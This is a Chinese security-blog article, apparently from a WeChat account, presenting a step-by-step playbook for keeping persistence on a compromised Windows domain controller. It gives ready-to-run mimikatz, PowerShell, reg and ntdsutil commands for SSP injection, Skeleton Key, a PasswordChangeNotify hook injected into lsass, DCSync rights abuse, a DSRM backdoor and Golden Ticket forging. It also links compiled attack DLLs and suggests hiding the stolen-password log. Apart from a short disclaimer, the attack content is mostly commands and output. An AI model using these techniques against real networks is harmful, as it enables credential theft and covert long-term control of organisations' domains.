<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YTuzU3P3OxGzxVjVuk5_Tg)

免责声明

  

  

道一安全（本公众号）的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！

前言

  

  

在通过某个漏洞或者通过域用户机器抓取 hash 等手段拿到域控制器权限后，如果不做权限维持，很有可能因为域管理员将域控的密码修改了或者讲漏洞修复了，导致域控制器权限丢失，导致之前的努力都白费了。

SSP 注入权限维持

  

  

SSP(Security Support Provider) 是 Windows 操作系统安全机制的提供者。

简单地说，SSP 是个 DLL 文件，主要用来实现 Windows 操作系统的身份认证功能。在系统启动时，SSP 被加载到 lsass 进程中，攻击者可以制作恶意的 DLL 文件，在系统启动时将其加载到 lsass 进程中，就可以获取 lsass 进程中的明文账号密码。这样即使域管理员修改密码并重新登录，也可以获取到域控的权限。

**一：mimikatz 注入伪造的 SSP**

管理员权限启动 mimikatz

然后执行：

```
privilege::debug
misc::memssp

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHgPxJoJc3znoqcqjZXu34eYjgRWcOkltgQYckW1s9icR0TuoQ8dov0lV6YicLQVhwz98ico2LuI6ZQQ/640?wx_fmt=png&from=appmsg)

然后重新登录后，明文账号密码会存储在

C:\Windows\System32\mimilsa.log

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHgPxJoJc3znoqcqjZXu34ekKJFuxXusWBjPndS7L4zIjiaEwLrNNzocLDFzQUiasjtT8ibm8jE6W8iaw/640?wx_fmt=png&from=appmsg)

**二：加载 mimilib.dll**

将 mimikatz 目录中的 mimilib.dll 文件放到目标机器的 C:\Windows\system32 目录下，dll 位数需要与目标机器系统位数一致。

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHgPxJoJc3znoqcqjZXu34egve3bYvbZO5p5lpc7vFkEjKibSb2GdcBlHHUgGicnDl3BViaiarRmib51Lg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHgPxJoJc3znoqcqjZXu34eLvRyzKAhVZPic1Epr04k4ETHdclZqxbjFYH19BbJFAe1kRYaXaNnqhQ/640?wx_fmt=png&from=appmsg)

复制过去后用 PowerShell 修改注册表，将 mimilib.dll 追加到注册表内。  

```
powershell
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"  
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ 

```

regedit 查看下注册表是否添加成功

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHgPxJoJc3znoqcqjZXu34exQP9pjLtj4mLHrNoCpH0urWKP9jWsBE3KnhU1PJuYjHAp5DYzKicbpA/640?wx_fmt=png&from=appmsg)

然后重启系统，用户登录到系统后会在 c:\windows\system32 \ 目录下生成一个 kiwissp.log 文件存储登录的账号密码.

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHgPxJoJc3znoqcqjZXu34ecLNdnoslp3aSiaN6etdIBqZyfGPVoyxyYQwtW9aibn3gb22LzSpe0nIw/640?wx_fmt=png&from=appmsg)

Skeleton Key 万能密码  

  

  

Skeleton Key(万能密码)，是一种可以对域内权限进行持久化的操作，通过将 Skeleton Key 注入到 lsass 进程（需要管理员权限），不需要重启机器即可生效，再不影响原账号登录的情况下，此帐号也可登录，它只存在于内存中，如果域控制器重启，注入的 Skeleton Key 将会失效。

在域控机器使用 mimikatz 执行如下目录将万能密码注入到 lsass 进程

管理器权限启动 mimikatz

```
privilege::debug
misc::skeleton

```

默认密码为 mimikatz

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHiahErI7bHlRYgz9bAnV1XibY0OicraFLc4L0ibNd3HBnrvr75yYa0egDmib7YCEtm3pdXzcnNqEVBDTQ/640?wx_fmt=png&from=appmsg)

此时 skeleton key 已经注入成功，会在所有的账号中添加一个 skeleton key，密码为 mimikatz

然后找一台域内用户机器与域控建立 IPC 连接

```
net use \\owa\ipc$ "mimikatz" /user:redteam\administrator

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHiahErI7bHlRYgz9bAnV1XibMXKwFek5lKG4Y5QcK3TtQrKEA3MTLIzEWcmKXshGjgwvGAuJIXIOOg/640?wx_fmt=png&from=appmsg)

查看 C 盘目录

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubHiahErI7bHlRYgz9bAnV1Xib79btWhicAVt166icMicgSIicicrwk3icfSFuQtJqGXT4HTEiaqicTiacwnvtUXw/640?wx_fmt=png&from=appmsg)

Hook PasswordChangeNotify 攻击

  

  

原理：

在修改域控的密码时，LSA 会先调用 PasswordFileter 来检查密码是否符合复杂性要求，如果符合 LSA 会调用 PasswordChangeNotify 在系统中同步修改后的密码。

如果攻击者 hook 了该功能，就会直接获取到用户修改后的明文账号密码。

利用方法：

生成 dll，先下载源码：https://github.com/clymb3r/Misc-Windows-Hacking

然后用 VS 开发环境将下载的源码编译成 dll 文件，编译前需要先讲 MFC 设置为 “在静态库中使⽤ MFC 编译⼯程

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmLtsMibZNK3tWjNKJ8BiaUHjcoa3MYiaD61DxucRpFk7usoUzUzJu5qpibg/640?wx_fmt=png&from=appmsg)

编译好后，下载 PowerShell 脚本将 HookPasswordChange.dll 注入到内存

这里给一下我编译好的 dll 和用到的 PowerShell 文件：

https://daoyisec.lanzn.com/isQ0W26oqkfe

下载地址：

https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1

在目标系统中使用管理员权限启动 PowerShell

然后执行如下命令：

```
Set-ExecutionPolicy bypass
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmPSbiclwgTcHhMKdQ7lB46kvKtZLCrOUJq0Fmmkllv9wdicKl1nxbBymQ/640?wx_fmt=png&from=appmsg)

此时修改密码时，将会自动记录到如下文件内，可以修改这个文件路径保存到更隐蔽的路径

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmdb5GJD0I3Bv1CvE9ulFjHeVL9hweic7JVicGPh8CxeKichiaMTuJLVPCXA/640?wx_fmt=png&from=appmsg)

执行 net user Administrator 修改后的密码

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmviateW5pziarJ6n4oG32adiblcPhBgzPr6kv9xzK3VyG8cUX3RKs4eXPg/640?wx_fmt=png&from=appmsg)

Dcsync

  

  

原理：

在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。

利用方法：

    前提条件：

    需要拥有一下任意用户的权限

    Administrators 组内的用户

    Domain Admins 组内的用户

    Enterprise Admins 组内的用户

    域控制器的计算机帐户

（假设现在获取到了一台域控权限和一台普通用户 sqlserver 权限）

现在通过 powerview.ps1 脚本向 sqlserver 用户添加三条 ACE

DS-Replication-Get-Changes—>(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)

DS-Replication-Get-Changes-All—>(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

DS-Replication-Get-Changes—>(GUID:89e95b76-444d-4c62-991a-0facbeda640c)

具体命令：

```
powershell -exec bypass
Import-Module .\powerview.ps1
Add-DomainObjectAcl -TargetIdentity “DC=redteam,DC=red”-PrincipalIdentity sqlserver -Rights DCSync -Verbose

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmZAARZB5Z8J9bPpkziah7WfszibFt4q1Y0gibiasMTcujicvHBXPzxlr92Gg/640?wx_fmt=png&from=appmsg)

添加好 ACE 后，在 sqlserver 普通用户上 通过 mimikatz 导出域内所有 hash

```
privilege::debug
lsadump::dcsync /domain:redteam.red /all /csv

```

DSRM 后门

  

  

原理：

每个域控制器都有一个目录还原模式（DSRM）帐户，它的密码是在安装域控时设置的，实际上它对应的就是 sam 文件里的本地管理员 “administrator”，基本很少会被重置，因此有着极强的隐蔽性。攻击者通过获取域控的 DSRM 密码，就可以使用帐户通过网络登录到域控服务器，从而达到权限维持的目的。

操作系统版本：

windows server2008（需安装 KB961320 才可以使用指定域账号的密码对 DSRM 的密码进行同步）及以后的版本

利用方法：

1.  1. 先用 mimikatz 查看域内普通账号 sqlserver 的 hash
    

```
privilege::debug
lsadump::lsa /patch /name:test

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWm8icj4Qk9LZSzz3HWY8tTJqBIMCz5Txibs8uopKJ47JOl5cia6vibuiarNYw/640?wx_fmt=png&from=appmsg)

由于 mimikatz 复制会导致卡死 可以输入 log 命令将输出记录到 log 文件内

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmgOeuaEsUtfESRj0yEFyfGM9bFiaDPIhgNe2mujuprbglcIb6O1AZia2Q/640?wx_fmt=png&from=appmsg)

2. 使用 ntdsutil 工具将 DSRM 账号的 hash 和 sqlserver 的 hash 同步

```
ntdsutil
set dsrm password
sync from Domain Account sqlserver
q
q

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmJwZQ1OlibX3L9I2OEYCyOxjY5D3Q9qcFgUmHe6BFec96Idsnkn4nq7g/640?wx_fmt=png&from=appmsg)

3. 抓包 dsrm hash 可以看到已经和最开始抓取 sqlserver 的密码一致了

```
privilege::debug
token::elevate
lsadump::sam

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmAtpRRdU8QMkU7DLiaZTrt72y8o2ib4icZK4kXG9VG3vIJa6h35qjK4mFQ/640?wx_fmt=png&from=appmsg)

4. 修改 DSRM 登录方式

DSRM 一共有三种登录方式：

0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号

1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器

2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器

如果需要用 DSRM 登录到域控制器 需要将其登录方式修改为 2

执行如下命令修改注册表：

```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmUZzXKXawCqeXWmLyC81PL7WxdnTWMgbSRmCTRic2uumibmfupPwgKkAw/640?wx_fmt=png&from=appmsg)

然后再其他的域普通用户机器上，通过 mimikatz 使用 dsrm 进行登录

```
sekurlsa::pth /domain:owa/user:administrator /ntlm: 6a59bf65a4957ac67e5fb4e1c221939c

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmkheE5QKZGOnU75xyR0t3sHhwcA8KlGLEo7WtfseBfJUib5KqSp32Kfw/640?wx_fmt=png&from=appmsg)

黄金票据

  

  

前置知识：

Kerberos 认证：

*   KDC(Key Distribution Center)：    密钥分发中心，里面包含两个服务：AS 和 TGS
    
*   AS(Authentication Server)：    身份认证服务
    
*   TGS(Ticket Granting Server)：    票据授予服务
    
*   TGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为 10 小时
    
*   Pass The Ticket：如果我们能够拿到用户的 TGT，并将其导入到内存，就可以冒充该用户获得其访问权限
    

Golden Ticket（下面称为金票）是通过伪造的 TGT（TicketGranting Ticket），因为只要有了高权限的 TGT，那么就可以发送给 TGS 换取任意服务的 ST。可以说有了金票就有了域内的最高权限。

每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来生成的，那么，我们如果拿到了 krbtgt 的密码 Hash，其实就可以伪造任意用户的 TICKET,

对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出 krbtgt 的 Hash 值，，再通过 mimikatz 即可生成任意用户任何权限的 Ticket，也就是 Golden Ticket。

前提条件：

需要伪造的域管理员用户名（一般是域管账户）

完整的域名

域 krbtgt SID（就是域成员 krbtgt SID 去掉最后的）

krbtgt 的 NTIL Hash 或 AES-256 值

利用方法：

真实环境下可以通过 zerologon 漏洞或其他漏洞获取域控权限后导出 KDC 的 hash（krbtgt 的 hash）后，进行黄金票据攻击。

1  导出 krbtgt 的 NTLM hash（域控）

```
log
privilege::debug
lsadump::dcsync /domain:redteam.red /user:krbtgt

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmNlcQNMIgaLsrBy6q2TSPhaE7WJ2GAUiaIhZzmkMS8TGFb7ickanfuia8w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmgOWzfjMaKrAswJVs0fwArm57Nks6rThUlBT02eJuYsLvTEwIAMCuFQ/640?wx_fmt=png&from=appmsg)

复制出 log 文件里这三个值

```
Object Security ID   : S-1-5-21-1359007890-1682372173-1631803504-502
这个值最后面的-502去掉
Hash NTLM: 4a67f14d5cc4fa22618c8b609e832db6
aes256_hmac(4096) : 67075a54cf9106904392e010bcd3caec5cc3d57d3c65b42065482ae53910ddbd

```

2 使用 mimikatz 清空当前主机会话中的票据（普通用户）

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmyKjlEZ8xSdg1TebJVHOLaONzRS9wj75qicfhxDFkE3W8LjDfibsiacHiaw/640?wx_fmt=png&from=appmsg)3. 使用 mimikatz 生成票据

```
kerberos::golden /user:administrator /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504 /krbtgt:4a67f14d5cc4fa22618c8b609e832db6 /ticket:Administrator.kiribi

```

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmMhGDyE4jJGgzibQJeWhzMvFK33I84z5XWVMoEkALsQu2nqRuSXfNPpQ/640?wx_fmt=png&from=appmsg)

参数解释：

/admin：伪造的⽤户名

/domain：域名称

/sid：SID 值，注意是去掉最后⼀个 - 后⾯的值

/krbtgt：krbtgt 的 HASH 值

/ticket：⽣成的票据名称 // 不是写⼊内存中的命令！

4. 使用 mimikatz 将票据注入内存（普通用户机器）

管理器权限启动 mimikatz

```
privilege::debug
kerberos::ptt 票据文件

```

然后查看票据是否注入成功

```
kerkeros::list

```

最后 dir 域控

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubE9MyJAIZ9VWBbvUBeXhGWmicdLXE5PMHaQJ0msv6icvEhibfxMiaM4FXnfeicK5o99VosW97fN1eDDgKQ/640?wx_fmt=png&from=appmsg)

联系我们

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/WAyrRuvrubGNIiaG0Mg4FZ85BtUFLg9pXeTIwxZmgUMKEvTFickkUThj7JYYZSEnc910eHc2j6ppDqceqNK9qEEg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

群内不定期更新各种 POC

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubEnmrSbNrxiapV7OuFGHcbphCxSX3ia3k3iazWrpKcmMcSS2Npibicl6dKeEYmSSzUlaFtL5Mu9wrCTspw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/WAyrRuvrubGbqzHel6ZMgMG9a267xj5TPLicxCCde3VgckZyUoJ6ZYWoicsO3K2AeuCIQ2To6o6SibCurdtkkBNXg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)